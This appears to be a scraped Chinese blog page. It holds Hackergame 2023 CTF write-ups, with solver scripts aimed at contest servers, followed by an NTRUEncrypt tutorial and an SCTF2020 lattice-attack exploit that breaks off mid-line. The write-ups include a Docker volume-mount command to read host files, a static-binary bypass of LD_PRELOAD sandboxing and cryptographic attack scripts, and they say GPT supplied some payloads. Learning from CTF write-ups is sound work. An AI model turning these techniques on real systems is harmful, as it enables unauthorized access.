'session=eyJ0b2tlbiI6IjcxNDpNRVVDSUMwTFByNHBrS3QyQmwrU3dCQUpVbE1wdldmRU1wSzIyeTcxYzVxV3diTmFBaUVBcXVUYTFxS3kxYXdYOGxnc0lBOExtK215NEZ1RlB3SEVvM053cnJXZGJlND0ifQ.ZT3Olw.PIfDty1-kKuL1PSgMf8Et1GIJv4'} res = r.post(url, headers=headers, data=payload).text pat = re.compile(r'(\\d+)。') score = re.findall(pat, res) return int(score[0])for i in range(100): res = crack(str(i)) if res == 60: print(i) break 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。问一下 GPT 就行，直接就出 CONFIG_TCP_CONG_BBR 了。 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）提示：会议的大写英文简称，比如 ISCA、CCS、ICML。搜一下就有，找到 Python Type Hints are Turing Complete 这篇文章，在 ECOOP 发表。 更深更暗水题，F12，随便展开一下元素就找到 flag 了。 旅行照片 3.0可以直接看官方 wp。学长晚上的行程注意看脖子上带子的文字就行。 赛博井字棋霸道的力量，用 hackerbar 下到人机下过的位置就行。 奶奶的睡前 flag 故事截图漏洞，之前见过 Windows 的，谷歌的亲儿子手机就是 Pixel，直接搜 Pixel screenshot hack 就行了。找到网站，手机型号选择最新的不行，换个老点的就可以了。 组委会模拟器F12 看下请求，发现会先拿到全部 1000 条消息，包含消息 id、内容和时间，点击消息会发消息的 id 到服务端，这样的话我们用 python 直接梭就行了。注意要按时间发包，不然会返回“发生了时空穿越”的失败提示。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import timeimport requests as rimport jsonimport refrom tqdm import tqdmurl = 'http://202.38.93.111:10021/api/getMessages'headers = {'Cookie': &lt;cookie&gt;}res = r.post(url, headers=headers).textdef delmsg(idd): url = 'http://202.38.93.111:10021/api/deleteMessage' headers = {'Cookie': &lt;cookie&gt;, 'Content-Type': 'application/json',} data = {'id': idd} res = r.post(url, headers=headers, data=json.dumps(data)).text res = json.loads(res) if res['success'] == True: return True return res['error']start_time = time.time()js = json.loads(res)msg = js['messages']msg = list(msg)for m in msg: pat = re.compile(r'hack\\[[a-z]+\\]') flag = re.search(pat, m['text']) if flag: m['flag'] = True else: m['flag'] = False# with open('output.txt', 'w+') as f:# for m in msg:# f.write(f&quot;{m['flag']} {m['text']}\\n&quot;)for i in tqdm(range(len(msg))): txt = msg[i]['text'] delay = msg[i]['delay'] while True: current_time = time.time() - start_time if current_time &gt; delay: if msg[i]['flag']: res = delmsg(i) if res != True: print(txt) print(res) break # 添加退出条件 else: break # 添加退出条件url = 'http://202.38.93.111:10021/api/getflag'res = r.post(url, headers=headers).textprint(json.loads(res)) 虫SSTV，在 github 找个 Decoder 就行，舍友还在那播放，太折磨了（）。 JSON ⊂ YAML?第一问 GPT 给出的答案五花八门，但是都不行，最后还是去找了文档一个个试试出来的浮点数可以触发。第二问 GPT 倒是好使，直接说两个相同的 key 会触发。两个 payload 分别是 {&quot;null&quot;: -2E+05} 和 {&quot;null&quot;: &quot;yes&quot;,&quot;null&quot;:&quot;no&quot;}。 Git? Git 叹号（标题直接打 ！的话 markdown 报错，看着难受）问了 GPT，让我用 reflog，如下： 12345$ git reflogea49f0c (HEAD -&gt; main) HEAD@{0}: commit: Trim trailing spaces15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~505e1a3 HEAD@{2}: commit: Trim trailing spaces15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git 可以看到，15fd0a1 是撤销的操作，我们用 diff 看一下修改了什么就行了： 1git diff 505e1a3 15fd0a1 --patch HTTP 集邮册前面两问胡乱试几下就有了。最后一问没搞出来。 Docker for Everyone告诉一下 GPT 可以执行 docker 命令，就给出 payload 了 1docker run -v /dev/shm:/dev/shm --rm -it alpine cat /dev/shm/flag 还解释得挺详细： 在这个命令中：docker run 是用来创建并运行一个新容器的命令。-v /dev/shm:/dev/shm 是一个卷参数，它将主机上的/dev/shm目录挂载到容器的/dev/shm目录。–rm 是一个选项，它会在容器退出时删除容器，以避免留下任何残留数据。-it 是一个选项，它会为容器提供一个交互式终端。alpine 是你想要运行的容器镜像的名称。cat /dev/shm/flag 是你想在容器内运行的命令，它会尝试读取并输出/dev/shm/flag的内容。 惜字如金 2.0手调即可。 12345678910111213141516171819202122232425262728293031323334353637383940# Th siz of th fil may reduc after XZRJificationdef check_equals(left, right): # check whether left == right or not if left != right: raise ValueErrordef get_code_dict(): # prepar th cod dict code_dict = [] code_dict += ['nymeh1niwemflcir}echaet0'] # 0-23 code_dict += ['a3g7}kidgojernoetlsup?h0'] # 24-47 code_dict += ['uulw!f5soadrhwnrsnstnoeq'] # 48-71 code_dict += ['ct.{l-findiehaai{oveatas'] # 72-95 code_dict += ['ty9kxborszst.guyd?!blm-p'] # 96-119 # print(len(code_dict[0])) # print(set(len(s) for s in code_dict)) check_equals(set(len(s) for s in code_dict), {24}) return ''.join(code_dict)def decrypt_data(input_codes): # retriev th decrypted data code_dict = get_code_dict() output_chars = [code_dict[c] for c in input_codes] return ''.join(output_chars)if __name__ == '__main__': # check som obvious things check_equals('creat', 'cre' + 'at') check_equals('referrer', 'refer' + 'rer') # check th flag flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90, 17, 118, 36, 25, 13, 89, 90, 3, 63, 25, 31, 77, 27, 60, 3, 118, 24, 62, 54, 61, 25, 63, 77, 36, 5, 32, 60, 67, 113, 28]) print(flag) check_equals(flag.index('flag{'), 0) check_equals(flag.index('}'), len(flag) - 1) # print th flag # print(flag) 高频率星球发现原来不装 asciinema 也能玩，一点点用 Ctrl + H 把 ANSI 转义字符删掉就行了。 小型大语言模型星球第一问直接问 Am I smart? 就能套出话来了。第二问已经重装系统了，本地模型都跑不起来，就懒得爆了。 低带宽星球第一问随便压缩一下就行。第二问应该是要手造了，懒得造了。 为什么要打开 /flag 😡第一问还是 GPT 给出的： 绕过 LD_PRELOAD 注入的共享对象可以比较困难，因为这是一种强大的机制，它允许开发者或系统管理员在运行时更改动态链接的行为。在安全相关的场景或者 Capture The Flag (CTF) 类型的比赛中，绕过这样的限制通常需要一些创造性的方法和对系统工作方式的深刻理解。在给定的上下文中，LD_PRELOAD 用于注入一个共享库（lib.so），这个共享库通过各种方法拦截和更改了文件操作、执行新程序的系统调用。以下是一些可能的绕过策略： 1. 使用静态链接的二进制： 如果可行的话，使用一个静态链接的二进制文件可以避免 LD_PRELOAD 的影响，因为静态链接的程序不会使用动态链接库。 … 想静态编译的话在编译的时候加个 -static 就行了。程序也是 GPT 写的： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() { FILE *file; char *line = NULL; size_t len = 0; ssize_t read; // 打开 /flag 文件 file = fopen(&quot;/flag&quot;, &quot;r&quot;); if (file == NULL) { perror(&quot;无法打开文件 /flag&quot;); return EXIT_FAILURE; } // 读取并打印 /flag 文件的内容 while ((read = getline(&amp;line, &amp;len, file)) != -1) { printf(&quot;%s&quot;, line); } // 释放资源并关闭文件 free(line); fclose(file); return EXIT_SUCCESS;} 黑客马拉松做的时候就感觉铁定非预期了，但是令人迷惑的是这才是最自然的思路，那非预期是不是算预期呢（）。说起来还是第二问给我的解题思路，看第一问看了半天发现第二问更简单，分数也是第二问更低，说明出题人是知道的，这样的题目顺序真是居心叵测。第二问直接取 $e = -1 \\mod \\varphi(N)$ 就过了。第一问严格点，还是这么取的话会触发 small loop，因为 $(-1)^2=1$ 嘛，所以取 $e = -3 \\mod \\varphi(N)$ 就行了。两问都是二元 coppersmith 的形式。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from sage.all import *from pwn import *r = remote('202.38.93.111', 20230)import itertools def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N**(m-i) * f**i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []# context.log_level = 'debug'p = 20888518302262822708640092467070098180239940282964311580846713529915991035084176547285976560408772270176488335531054066899663135571600859126844374032782889lfp = 641940332996671520364775722844731269161q = 6214251232316644767865593529639904703813556510242875683726437167720285962376267466666131377504429682587986680767643437843442269652671382746406944152412577lfq = 381239571907162860348261198437277761621phi = (p - 1) * (q - 1)e = phi - 1token = &lt;token&gt;r.sendlineafter(b'Please input your token:', token.encode())r.sendlineafter(b'p:', str(p).encode())r.sendlineafter(b'q:', str(q).encode())r.sendlineafter(b'A large prime factor of p-1: ', str(lfp).encode())r.sendlineafter(b'A large prime factor of q-1: ', str(lfq).encode())r.sendlineafter(b'e:', str(e).encode())r.sendlineafter(b'Choose mission: ', b'2')bl = eval(r.recvline().decode().strip())[0]n = p*qPR = PolynomialRing(Zmod(n), names=('a', 'bh'))(a, bh) = PR._first_ngens(2)f = a * (bh * 2**928 + bl) - 1sol = small_roots(f, [2**96, 2**96], d=2)_, bh = sol[0]b = (bh * 2**928 + bl) % nprint(b)r.sendlineafter(b'Predict PRNG state: ', str(b).encode())flag = r.recvline().decode().strip()success(flag)r.close() 不可加密的异世界 2关键就是在 GF(257) 里运算后结果还模了 256，所以有一些 256 变成了 0 返回。那么我们看到的 0 就不知道它原来是 0 还是 256 了。观察字符的规律，可以发现 ascii 码的最高位一定为 0，那么就可以用异或制造相差 128 的两轮差分，这时候能还原矩阵的大部分，少部分没还原是因为上面的原因。这时候如果拿到的向量含 0，就可以用次高位来继续拿一组进行修复，因为我们拿到了向量的大部分，所以可以分别假设次高位为 0 和 1，然后和已知向量进行比较，最像的那个就是正确的。这时候基本有一半左右概率还原了，我们可以算一下概率，上面方法出错的可能只会是因为三组向量中有两个 0 同时出现在一个位置或者三 0 合一（极品情况）。对任一元素，三次都不是 0 或者只出一次 0 的概率为 $(\\frac{255}{256})^3 + 3 \\times \\frac{1}{256} \\times (\\frac{255}{256})^2 = \\frac{8388225}{8388608}$，即出现问题的概率为 $\\frac{383}{8388608}$，然而即使出了问题，我们也有一半的概率直接猜对（默认猜 0 原本就是 0），所以单个元素出错概率为 $\\frac{383}{16777216}$，正确概率为 $\\frac{16776833}{16777216}$，那么 128*128=16384 个元素全部正确的概率为 $(\\frac{16776833}{16777216})^{16384}\\approx 0.687957850470333$。当然如果觉得还不够爽可以像我一样再抽一发修正，这样基本很接近 100% 了。第二问直接求个特征向量，第三问再套个 CVP，此时维数比较大，LLL 的结果不够理想，需要用 BKZ。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132from Crypto.Util.number import *from pwn import *from sage.all import *from tqdm import tqdmr = remote('202.38.93.111', 22000)token = &lt;token&gt;r.sendlineafter(b'Please input your token:', token.encode())times = 0def enc(m): global times times += 1 r.sendlineafter(b'&gt;', m.encode()) r.recvuntil(b'you ciphertext : ') cipher = r.readline().decode().strip() return cipherdef getvec(i, num='00'): return '11'*i + num + '11'*(128-i-1)def getzero(vec): return [i for i in range(128) if vec[i] == 0]def bit_recover(b1, b2, diff): return (b1 - b2)*pow(diff, -1, 257) % 257def vec_recover(v1, v2, diff): return [bit_recover(b1, b2, diff) for b1, b2 in zip(v1, v2)]def diff_attack(idx): # suppose xorflag = '00000000' xorflag = 0 c00 = bytes.fromhex(enc(getvec(idx, '00'))) c80 = bytes.fromhex(enc(getvec(idx, '80'))) most = vec_recover(c80, c00, 0x80) zero00 = getzero(c00) zero80 = getzero(c80) # if no zero in c00 and c80, then most is correct if len(zero00+zero80) == 0: return most zero0080 = list(set(zero00) &amp; set(zero80)) for i in zero0080: # remove the zero in zero00 and zero80, they will be patched later zero00.remove(i) zero80.remove(i) c40 = bytes.fromhex(enc(getvec(idx, '40'))) zero40 = getzero(c40) k40 = vec_recover(c40, c00, -0x40) k41 = vec_recover(c40, c00, 0x40) if abs(norm(vector(ZZ, most)-vector(ZZ, k40))) &lt; abs(norm(vector(ZZ, most)-vector(ZZ, k41))): xorflag ^= 0x40 zero0040 = [] zero4080 = [] for i in zero00: if i in zero40: zero0040.append(i) continue most[i] = bit_recover(c80[i], c40[i], (xorflag^0x80)-(xorflag^0x40)) for i in zero80: if i in zero40: zero4080.append(i) continue most[i] = bit_recover(c40[i], c00[i], (xorflag^0x40)-xorflag) if len(zero0040+zero4080+zero0080) == 0: return most c20 = bytes.fromhex(enc(getvec(idx, '20'))) k20 = vec_recover(c20, c00, 0x20) k21 = vec_recover(c20, c00, -0x20) if abs(norm(vector(ZZ, most)-vector(ZZ, k20))) &gt; abs(norm(vector(ZZ, most)-vector(ZZ, k21))): xorflag ^= 0x20 for i in zero0040: most[i] = bit_recover(c80[i], c20[i], (xorflag^0x80)-(xorflag^0x20)) for i in zero4080: most[i] = bit_recover(c20[i], c00[i], (xorflag^0x20)-xorflag) for i in zero0080: most[i] = bit_recover(c40[i], c20[i], (xorflag^0x40)-(xorflag^0x20)) return most m = []for i in tqdm(range(128)): m.append(diff_attack(i))success('recover key in {} times'.format(times))c = bytes.fromhex(enc('0'*255+'1'))M = matrix(GF(257), m).transpose()result = (M**(-1)) * vector(GF(257), list(c))flag = ''.join([chr(int(i)) for i in result])flag1 = flag.split('\\n')[0]success('flag1: '+flag1)# V = (M - matrix.identity(128)).right_kernel().basis_matrix()# v = V[0]# print(v)# v = bytes(v)# v = hex(bytes_to_long(v))[2:].zfill(256)# print(v,len(v))# r.sendlineafter(b'&gt;', v.encode())def cvp(M, v, d=2**10, mothod='BKZ'): p = M.base_ring().characteristic() M = M.change_ring(ZZ) v = v.change_ring(ZZ) M = M.stack(matrix.identity(M.ncols())*p) M = M.stack(-v) M = M.augment(vector(ZZ, [0]*(M.nrows()-1)+[d])) if mothod == 'LLL': M = M.LLL() else: M = M.BKZ() vv = vector(ZZ, M[-1][:-1]) return vv+vZ = (M - matrix.identity(128)).right_kernel().basis_matrix()v = cvp(Z, vector(ZZ, [0x50]*128))v = hex(bytes_to_long(bytes(list(v))))[2:].zfill(256)r.sendlineafter(b'&gt;', v.encode())r.recvuntil(b'[+] unbelievable !!! You are an excellent hacker!\\n')flag2 = r.readline().decode().strip()success('flag2: '+flag2)r.recvuntil(b'[+] how can you find such an exquisite solution?\\n')flag3 = r.readline().decode().strip()success('flag3: '+flag3)r.close()","link":"/2023/11/05/Hackergame2023-writeups/"},{"title":"NTRUEncrypt","text":"NTRUEncrypt 公钥加密系统 简介这里基本摘自维基百科，少少枯燥，可以自行选择略读。 NTRUEncrypt 是一个公钥加密系统，它的安全性基于这样一个问题的困难性：在一个截断多项式环（这个翻译怪怪的）中将一个给定的多项式分解成两个系数非常小的多项式的商。由于加密与解密都只涉及简单的多项式乘法，故相比于其他的加密系统， NTRUEncrypt 的效率会更高。具体来说， NTRU 的操作基于截断多项式环中的对象 ${\\displaystyle \\ R=\\mathbb {Z} [X]/(X^{N}-1)}$ 中的卷积乘法，并且环上的所有多项式的系数和次数都为不大于 $N-1$ 的整数。实际上， NTRU 是一个参数化系统，每个系统由三个整数指定 $(N,p,q)$ ，其中 $N$ 代表截断环上的所有多项式的最高次为 $N-1$ ， $p$ 和 $q$ 分别代表一个小模数和一个大模数。其中 $N$ 为素数， $q$ 大于 $p$ ，且 $p$ 与 $q$ 互质。由这三个参数生成四个多项式 $\\mathcal {L}_f,\\mathcal {L}_g,\\mathcal {L}_m \\thinspace$ 和 $\\mathcal {L}_r$ ，分别为私钥、公钥、消息和干扰数。 看到这里，我相信懂的人都懂的，不懂的人还不懂（bushi）下面从宏观和微观两方面详细解释 公钥生成又双叒叕来到了密码学的老 CP —— Alice 和 Bob Bob 根据选定的 $N,p,q$ 生成最高次为 $N-1$ 的 $f$ 和 $g$ 两个多项式，并且系数在 ${-1,0,1}$ 中选取（可以认为这俩是在模 $X^{N}-1$ 的剩余类中）。 $f$ 还要满足模 $q$ 和 $p$ 的逆元存在，如果不满足，那就重新生成。 分别计算 $f$ 模 $p$ 和模 $q$ 的逆元，即 $f_{p}$ 和 $f_{q}$ ，保留 $f$ , $f_{p}$ 及 $g$ 作为私钥，公钥 $h=pf_{q} \\cdot g\\ \\pmod{q} $ 。 sagemath 代码如下 123456789101112131415161718192021222324252627282930313233def generate_keys(): ''' 基于提供的参数生成一个公私钥对 返回 f (私钥)和 F_p (公钥)''' # 校验 if validate_params(): while True: try: # 生成两个随机多项式 f 和 g ，并且非零系数小于给定的 d f = generate_polynomial(d) g = generate_polynomial(d) # 假定 q 是 2 的幂，求得 f 模 q 的逆元 f_q = invertmodpowerof2(f,q) # 同样假定 p 是素数，求得 f 模 p 的逆元 f_p = invertmodprime(f,p) break except: # 上面如果抛出异常，即逆元不存在，则重新生成 pass # 公钥 h=pf_p*g (mod q) public_key = balancedmod(p * convolution(f_q,g),q) # 保留 f 和 f_p 作为私钥 secret_key = f,f_p return public_key,secret_key else: print(&quot;Provided params are not correct. q and p should be co-prime, q should be a power of 2 considerably larger than p and p should be prime.&quot;) 加密Alice 将消息 $m$ 转化成一个系数在 ${-1,0,1}$ 之间的多项式（比如转成二进制或三进制，二进制在这里会有些浪费），再随机生成一个系数较小（但不限于 ${-1,0,1}$ 中）的多项式 $r$ 作为干扰以掩盖消息。那么加密计算如下：$$ e=r \\cdot h+m \\pmod{q}$$举个栗子：当取 $N=5,p=3,q=32$ 时（呃这里待更新）$$ f=-1+X+X^2$$ 123456789101112131415def generate_message(): ''' 随机生成一个系数在{-1,0,1}中的多项式''' result = list(randrange(3) - 1 for _ in range(N)) return Zx(result)def encrypt(message, public_key): ''' 基于提供的公钥加密消息''' # 生成一个随机多项式，并且非零系数小于给定的d，作为干扰以掩盖消息 r = generate_polynomial(d) # 加密：e = r * h + m (mod q) # while performing modulo operation, balance coefficients of encrypted_message # for the integers in interval [-q/2, +q/2] return balancedmod(convolution(public_key,r) + message,q) 解密由于其他人不知道 $r$ ，所以无法直接 $m=e-rh$ ，但 Bob 拿到 $e$ 后，可以计算出$$\\begin{equation*}\\begin{split} a &amp; = f \\cdot e \\pmod{q}\\\\ &amp; = f \\cdot (r \\cdot h+m) \\pmod{q}\\\\ &amp; = f \\cdot (r \\cdot pf_{q} \\cdot g+m) \\pmod{q}\\\\ &amp; = pr \\cdot g + f \\cdot m \\pmod{q}\\end{split}\\end{equation*}$$关键部分来了，以上都是在模 $q$ 下进行，而这时忽然就变成了模 $p$$$b=a=f \\cdot m \\pmod{p} \\\\c=f_{p} \\cdot b =f_{p} \\cdot f \\cdot m =m \\pmod{p}$$ 1234567891011def decrypt(encrypted_message, secret_key): ''' 基于提供的私钥解密密文''' # 拿到私钥的两个多项式 f,f_p = secret_key # a = f * e (mod p) a = balancedmod(convolution(encrypted_message,f),q) # c = f_p * a (mod p) return balancedmod(convolution(a,f_p),p) 函数实现下面从微观上解释一下上面函数的实现： 卷积多项式卷积满足公式$$ a(x)*b(x) = c(x) \\ with \\ c_k = \\sum_{i+j=k \\pmod} a_i b_{k-i \\pmod{N}}$$举个栗子：$$ f(x)=-1+4x+x^2 \\\\ g(x)=3-x+5x^2$$注意此时多项式和级数类似，采用低次项在先的书写方式则$$ f(x)*g(x) = c(x) \\pmod{3}$$其中$$c_0 = \\sum_{i+j=0 \\pmod{N}} f_i g_{0-i} = f_0g_0 + f_1g_2 + f_2g_1 = -1 \\times 3 + 4 \\times 5 + 1 \\times (-1) = -3 + 20 + (-1) = 16 \\\\c_1 = f_0g_1 + f_1g_0 + f_2g_2 = -1 \\times (-1) + 4 \\times 3 + 1 \\times 5 = 1 + 12 + 5 = 18 \\\\c_2 = f_0g_2 + f_1g_1 + f_2g_0 = -1 \\times 5 + 4 \\times (-1) + 1 \\times 3 = -5 + (-4) + 3 = -6$$故$$c(x) = 16 + 18x - 6x^2$$代码如下： 1234def convolution(f,g): ''' 多项式卷积运算''' return (f * g) % (x^N-1) 取模这里将多项式的每个系数 $f_i$ 拿出来，然后作变换 $g_i=(f_i+q/2)%q-q/2$ 再塞回去。这样每个系数都在 $[-q/2,q/2]$ 之间，这样可以保证模 $q$ 的运算。比如取 $q=3$ 时，有以下映射关系：$$-3 \\rightarrow (-3+1)%3 -1 = 0 \\\\-2 \\rightarrow (-2+1)%3 -1 = 1 \\\\-1 \\rightarrow (-1+1)%3 -1 = -1 \\\\0 \\rightarrow (0+1)%3-1 = 0 \\\\1 \\rightarrow (1+1)%3-1 = 1 \\\\2 \\rightarrow (2+1)%3-1 = -1 \\\\3 \\rightarrow (3+1)%3-1 = 0$$代码如下： 12345def balancedmod(f,q): ''' 多项式取模''' g = list(((f[i] + q//2) % q) - q//2 for i in range(N)) return Zx(g) 求逆元这也是我比较疑惑的一部分，一直不知道多项式的逆元具体怎么求，现在也看开了，随便怎么样吧，反正不是我手写（）这里先变基到 $X^N-1$ 商环然后求逆元再 lift 到整环上，关于原理我至今有点异或，有缘回来补坑吧。代码如下： 12345678910111213141516171819def invertmodprime(f,p): ''' 假定 p 为素数,计算一个多项式模 x^N-1 下的逆元再模 p 返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 p 为 1 不存在逆元时会抛出异常''' T = Zx.change_ring(Integers(p)).quotient(x^N-1) return Zx(lift(1 / T(f)))def invertmodpowerof2(f,q): ''' 假定 q 为 2 的幂，计算一个多项式模 x^N-1 下的逆元再模 q 返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 q 为 1 不存在逆元时会抛出异常''' assert q.is_power_of(2) # 断言 q 是 2 的幂 h = invertmodprime(f,2) # 首先求 f 模 2 的逆元 while True: r = balancedmod(convolution(h,f),q) # 计算 r = h * f (mod q) if r == 1: return h # 若 h * f = 1 (mod q)，则返回 h 即为所求逆元 h = balancedmod(convolution(h,2 - r),q) # 否则，h = h * (2 - r) (mod q) 攻击格约化攻击是一种非常著名的针对 NTRUEncrypt 的攻击，类似于 RSA 分解质因数。当选取的 $N$ 较小时，可以构造维度较低的格分解公钥 $h$ 。 例题 SCTF2020-Lattice12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from base64 import b16encodeZx.&lt;x&gt; = ZZ[]n = 109 q = 2048p = 3Df = 9Dg = 10Dr = 11def mul(f,g): return (f * g) % (x^n-1)def bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g)def random_poly(d): assert d &lt;= n result = n*[0] for j in range(d): while True: r = randrange(n) if not result[r]: break result[r] = 1-2*randrange(2) return Zx(result)def inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f)))def inv_mod_powerof2(f,q): assert q.is_power_of(2) g = inv_mod_prime(f,2) while True: r = bal_mod(mul(g,f),q) if r == 1: return g g = bal_mod(mul(g,2 - r),q)def keygen(): f = random_poly(Df) while True: try: fp = inv_mod_prime(f,p) fq = inv_mod_powerof2(f,q) break except: f = random_poly(Df) g = random_poly(Dg) h = bal_mod(p * mul(fq,g),q) pub_key = h pri_key = [f,fp] return pub_key,pri_keydef encrypt(m,h): r = random_poly(Dr) e = bal_mod(mul(h,r) + m,q) return eif __name__ == '__main__': pub_key,pri_key = keygen() flag=b'SCTF{***********}'[5:-1] m = Zx(list(bin(int(b16encode(flag), 16))[2:])) print(m) e = encrypt(m,pub_key) print('pub_key=') print(pub_key) print('e=') print(e)# pub_key=# 510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248# e=# -453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852 显然函数和上面的基本一样，只是名称相应地缩短了一下。攻击方法是构造如下的一个格，然后进行规约$$\\left(\\begin{array}{cccc|cccc}\\lambda &amp; 0 &amp; \\cdots &amp; 0 &amp; h_0 &amp; h_1 &amp; \\cdots &amp; h_{N-1} \\\\0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; h_{N-1} &amp; h_0 &amp; \\cdots &amp; 0 \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; h_1 &amp; h_2 &amp; \\cdots &amp; h_0 \\\\ \\hline0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q &amp; 0 &amp; \\cdots &amp; 0 \\\\0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; q &amp; \\cdots &amp; 0 \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; q\\end{array}\\right)$$具体可以参考这篇 Paper: https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&amp;rep=rep1&amp;type=pdf取 $\\lambda=1$ ，规约后最短向量即为 $[f\\enspace g]$ ，然后就可以计算私钥解密了。exp 如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from Crypto.Util.number import *import timestart = time.time()Zx.&lt;x&gt; = ZZ[]n = 109 q = 2048p = 3Df = 9Dg = 10Dr = 11h=510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 